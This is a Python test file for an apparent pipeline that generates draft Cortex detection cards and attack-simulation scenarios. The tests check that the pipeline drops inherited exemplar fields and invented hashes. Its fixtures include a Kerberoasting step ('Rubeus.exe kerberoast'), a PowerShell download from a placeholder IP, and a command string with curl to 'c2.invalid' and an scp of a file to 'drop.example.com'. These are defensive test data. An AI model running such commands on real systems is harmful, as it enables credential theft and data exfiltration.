"""The detection-authoring pipeline (scripts/detdev) and the draft library it stages.

The pipeline's first packager cloned a live card and scenario and overwrote only
the content fields, so 366 generated pairs inherited their exemplar's subject:
its Unit 42 source, its UC/TC refs, its tool, its identity, its cleanup line,
and one invented SHA-256 the model was asked to make "realistic". These tests
cover the replacement: a builder that takes only the fragment and its recorded
source, and the staged library rebuilt with it.
"""
from __future__ import annotations

import json
import re
import sys
from pathlib import Path

import pytest
import yaml
from jsonschema import Draft202012Validator

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
DETDEV = REPO_ROOT / "scripts" / "detdev"
if str(DETDEV) not in sys.path:
    sys.path.insert(0, str(DETDEV))

import genfrag  # noqa: E402
import library as lib  # noqa: E402
import manifest  # noqa: E402
import package  # noqa: E402

CARD_SCHEMA = Draft202012Validator(
    json.loads((REPO_ROOT / "detection_scanner" / "schema" / "ttp-entry.schema.json").read_text()))

ALERT = "Masquerading as the Linux crond process"
ALERT_URL = ("https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/"
             "masquerading-as-the-linux-crond-process")
TARGETS = {ALERT_URL: ALERT}
INVENTED_HASH = "a1b2c3d4e5f67890123456789012345678901234567890123456789012345678"


def _module(name: str = ALERT, url: str = ALERT_URL) -> str:
    return (f"Cortex XSIAM Analytics (XDR Agent) — {name}; Required Data: XDR Agent; "
            f"ATT&CK T1036.005. Ref: {url}")


def _fragment(platform: str = "linux", **over) -> dict:
    fragment = {
        "name": "crond started from a scratch path",
        "description": "A binary named crond runs from a scratch directory.",
        "mitre_technique_ids": ["T1036.005"],
        "target_platform": platform,
        "execution_payload": "cp /bin/sleep /var/tmp/cortexsim-draft/crond",
        "expected_artifacts": [],
        "biocs": [{"name": "crond outside sbin", "description": "x",
                   "logic": "dataset = xdr_data\n| filter action_process_image_name = \"crond\"",
                   "mitre_technique_ids": ["T1036.005"], "severity": "high",
                   "suppression_window_seconds": 0}],
        "abiocs": [], "xql_queries": [], "iocs": [],
        "analytics_modules": [_module()],
        "steps": [{"name": "copy", "command": "cp /bin/sleep /var/tmp/cortexsim-draft/crond",
                   "identity": "www-data", "detects": ["crond outside sbin", "no such detection"]}],
    }
    fragment.update(over)
    return fragment


def _build(fragment: dict, position: int = 1):
    return lib.build_pair(lib.rows_from_detects(fragment), index_position=position,
                          generated_on="2026-11-13", technique_names=lib.technique_index(),
                          targets=TARGETS)


# --------------------------------------------------------------------------- the builder


@pytest.mark.parametrize("platform, identity", [("linux", "root"), ("windows", "direct")])
def test_a_pair_is_built_from_its_fragment_and_source_alone(platform, identity):
    card, scenario, source = _build(_fragment(platform))

    assert source == {"kind": "cortex-analytics-alert", "name": ALERT, "url": ALERT_URL}
    assert (card["id"], scenario["scenario_id"]) == ("TTP-0000-0001", "SIM-DRAFT-001")
    assert card["status"] == scenario["status"] == "draft"
    assert list(CARD_SCHEMA.iter_errors(card)) == []

    # Subject fields a template would have supplied are simply absent.
    assert not {"threat_context", "remediation_guidance", "threat_scenarios"} & set(card)
    assert not {"uc_ref", "tc_ref", "tc_refs", "pov_scenario_id", "external_tools"} & set(scenario)
    assert [ref["url"] for ref in card["references"]] == [
        ALERT_URL, "https://attack.mitre.org/techniques/T1036/005/"]
    assert scenario["threat_report_url"] == ALERT_URL
    assert scenario["cleanup"]["commands"] == [lib.CLEANUP_PLACEHOLDER]

    # The platform decides what a step runs as; the model's own choice is not used.
    (step,) = scenario["steps"]
    assert (step["identity"], step["platforms"]) == (identity, [platform])
    assert scenario["execution_identity"] == {"default": identity, "options": [identity]}
    # A step declares only a detection the card carries.
    assert [row["detection_id"] for row in step["expected_detections"]] == ["bioc-crond-outside-sbin"]


def test_a_hash_is_carried_only_with_the_url_that_published_it():
    card, _, _ = _build(_fragment(iocs=[
        {"ioc_type": "file-sha256", "value": INVENTED_HASH, "reputation_required": "malicious"},
        {"ioc_type": "file-sha256", "value": "0" * 64,
         "source_url": "https://unit42.paloaltonetworks.com/some-post/"},
        {"ioc_type": "domain", "value": "c2.invalid"},
    ]))

    assert [ioc["value"] for ioc in card["detections"]["iocs"]] == ["0" * 64, "c2.invalid"]


def test_the_source_is_what_the_target_list_says_never_what_was_typed():
    # A wrong URL beside a listed name resolves to the listed URL.
    assert lib.source_of([_module(url="cortex-docs.paloaltonetworks.com/analytics-alerts.")],
                         TARGETS)["url"] == ALERT_URL
    # A name the list does not carry has no source, whatever URL sits beside it.
    card, scenario, source = _build(_fragment(
        analytics_modules=[_module(name="An alert nobody listed", url=ALERT_URL)]))
    assert source == {"kind": "not-recorded"}
    assert not any(ref.get("primary") for ref in card["references"])
    assert "threat_report_url" not in scenario


def test_restaging_an_old_pair_drops_everything_its_exemplar_supplied():
    old_card = {
        "id": "TTP-2026-0300",
        "identity": {"name": "PowerShell download", "description": "Downloads a file."},
        "threat_context": {"threat_actors": ["Mirai"]},
        "remediation_guidance": {"summary": "exemplar text"},
        "panw_mapping": {"products": [{"module": "cortex-xdr", "submodule": "exemplar"}]},
        "references": [{"title": "Mirai Variant V3G4", "primary": True,
                        "url": "https://unit42.paloaltonetworks.com/mirai-variant-v3g4/"}],
        "mitre_attack": {"techniques": [{"technique_id": "T1059", "subtechnique_id": "T1059.001"}]},
        "execution": {"target_platform": "windows", "payload": {"code": "iwr http://192.0.2.10/a"}},
        "detections": {"biocs": [{"name": "ps download", "logic": "dataset = xdr_data"}],
                       "iocs": [{"ioc_type": "file-sha256", "value": INVENTED_HASH}],
                       "analytics_modules": [_module()]},
    }
    old_scenario = {
        "scenario_id": "SIM-EDR-300", "name": "PowerShell download", "plane": "EDR",
        "uc_ref": "UCS-EDR-02", "tc_ref": "TC-EDR-03", "pov_scenario_id": "POV-SC-021",
        "threat_report_url": "https://unit42.paloaltonetworks.com/mirai-variant-v3g4/",
        "external_tools": [{"name": "Atomic Red Team", "adapter_ref": "TOOL-ATOMIC-RED-TEAM"},
                           {"name": "rubeus", "adapter_ref": "TOOL-RUBEUS"}],
        "steps": [{"id": "step-01", "name": "download", "identity": "www-data",
                   "command": "Rubeus.exe kerberoast; iwr http://192.0.2.10/a",
                   "expected_detections": [{"type": "BIOC", "description": "ps download",
                                            "ttp_ref": "TTP-2026-0300",
                                            "detection_id": "bioc-ps-download"}]}],
        "cleanup": {"commands": ["echo '[CortexSim] SIM-EDR-002 cleanup complete'"]},
    }

    card, scenario, _ = _build(lib.fragment_from_pair(old_card, old_scenario))
    text = json.dumps(card) + yaml.safe_dump(scenario)

    for inherited in ("mirai", "Mirai", "exemplar", "UCS-EDR-02", "TC-EDR-03", "POV-SC-021",
                      "SIM-EDR-002", "www-data", INVENTED_HASH, "ATOMIC-RED-TEAM"):
        assert inherited not in text, inherited
    # A tool a step really runs is content, and stays.
    assert [tool["adapter_ref"] for tool in scenario["external_tools"]] == ["TOOL-RUBEUS"]
    assert scenario["steps"][0]["expected_detections"][0]["ttp_ref"] == card["id"]


# --------------------------------------------------------------------------- the CLIs


def test_the_packager_previews_then_writes_only_into_staging(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(lib, "STAGING", tmp_path)
    monkeypatch.setattr(lib, "STAGED_CARDS", tmp_path / "cards")
    monkeypatch.setattr(lib, "STAGED_SCENARIOS", tmp_path / "scenarios")
    monkeypatch.setattr(lib, "REPO", tmp_path)
    frag = tmp_path / "frag.json"
    frag.write_text(json.dumps(_fragment()))

    assert package.main([str(frag)]) == 0
    assert "dry run" in capsys.readouterr().out
    assert sorted(p.name for p in tmp_path.iterdir()) == ["frag.json"]

    assert package.main([str(frag), "--apply"]) == 0
    assert package.main([str(frag), "--apply"]) == 0  # the next free id, never an overwrite
    assert sorted(p.name for p in (tmp_path / "cards").iterdir()) == [
        "TTP-0000-0001-crond-started-from-a-scratch-path.json",
        "TTP-0000-0002-crond-started-from-a-scratch-path.json"]
    assert sorted(p.name for p in (tmp_path / "scenarios").iterdir()) == [
        "sim-draft-001-crond-started-from-a-scratch-path.yml",
        "sim-draft-002-crond-started-from-a-scratch-path.yml"]


def test_the_generator_prompt_asks_for_the_platform_and_for_no_invented_indicator():
    system, user = genfrag.build_messages("brief", "edr", [], "windows")

    assert "PowerShell" in user and '"target_platform": "windows"' in user
    assert '"iocs": []' in user and "Never invent an indicator" in system
    for old in ("realistic", "STUB", "www-data"):
        assert old not in system + user
    # What --alert records is what the builder later reads back as the source.
    line = genfrag.alert_module(ALERT.upper(), ["T1036.005"], TARGETS)
    assert lib.source_of([line], TARGETS)["url"] == ALERT_URL
    assert genfrag.alert_module("not a listed alert", [], TARGETS) is None


def test_a_routable_host_is_one_traffic_would_really_leave_the_lab_for():
    command = ("curl http://192.0.2.10/a https://c2.invalid/b http://10.0.0.5/ "
               "-A 'Chrome/120.0.0.0' ; echo '<Task xmlns=\"http://schemas.microsoft.com/x\">' ; "
               "scp f user@drop.example.com: ; wget https://raw.githubusercontent.com/x/y ; ping 8.8.8.8")

    assert manifest.routable_hosts(command) == [
        "8.8.8.8", "drop.example.com", "raw.githubusercontent.com"]


# --------------------------------------------------------------------------- the staged library


def _staged() -> list[tuple[dict, dict]]:
    scenarios = {}
    for path in lib.STAGED_SCENARIOS.glob("*.yml"):
        scenario = yaml.safe_load(path.read_text())
        scenarios[scenario["scenario_id"]] = scenario
    cards = [json.loads(path.read_text()) for path in sorted(lib.STAGED_CARDS.glob("*.json"))]
    return [(card, scenarios.pop(f"SIM-DRAFT-{int(card['id'][-4:]):03d}")) for card in cards]


def test_every_staged_pair_is_a_draft_built_by_the_current_rules():
    pairs = _staged()
    assert len(pairs) == len(list(lib.STAGED_SCENARIOS.glob("*.yml"))) > 0

    for card, scenario in pairs:
        where = card["id"]
        platform = card["execution"]["target_platform"]
        assert lib.PROVISIONAL_CARD_RE.match(card["id"]), where
        assert lib.PROVISIONAL_SCENARIO_RE.match(scenario["scenario_id"]), where
        assert card["status"] == scenario["status"] == "draft", where
        assert list(CARD_SCHEMA.iter_errors(card)) == [], where
        assert not {"threat_context", "remediation_guidance", "uc_ref", "tc_ref"} & (
            set(card) | set(scenario)), where
        assert scenario["cleanup"]["commands"] == [lib.CLEANUP_PLACEHOLDER], where
        assert all(lib.url_host(ref["url"]) in lib.ALLOWED_REFERENCE_HOSTS
                   for ref in card["references"]), where
        assert lib.filter_iocs(card["detections"]["iocs"])[1] == [], where
        for step in scenario["steps"]:
            assert step["platforms"] == [platform], (where, step["id"])
            assert step["identity"] == lib.IDENTITY[platform], (where, step["id"])
            assert all(row["ttp_ref"] == card["id"] for row in step["expected_detections"]), where


def test_the_manifest_and_index_describe_the_staged_library_as_it_is():
    current = manifest.build()

    assert json.loads((lib.STAGING / "MANIFEST.json").read_text()) == current
    assert (lib.STAGING / "INDEX.md").read_text() == manifest.render_index(current)
    assert current["summary"]["pairs"] == len(list(lib.STAGED_CARDS.glob("*.json")))


def test_the_corpus_and_the_image_do_not_read_the_staged_library():
    for corpus in (REPO_ROOT / "scenarios", REPO_ROOT / "detection_scanner"):
        assert corpus not in lib.STAGING.parents
    copied = re.findall(r"^COPY\s+(?!--from)(\S+)", (REPO_ROOT / "core" / "Dockerfile").read_text(), re.M)
    assert not [src for src in copied if src.startswith("drafts")]
    live_ids = {json.loads(p.read_text())["id"] for p in (REPO_ROOT / "detection_scanner" / "ttps").glob("*.json")}
    assert not [i for i in live_ids if lib.PROVISIONAL_CARD_RE.match(i)]
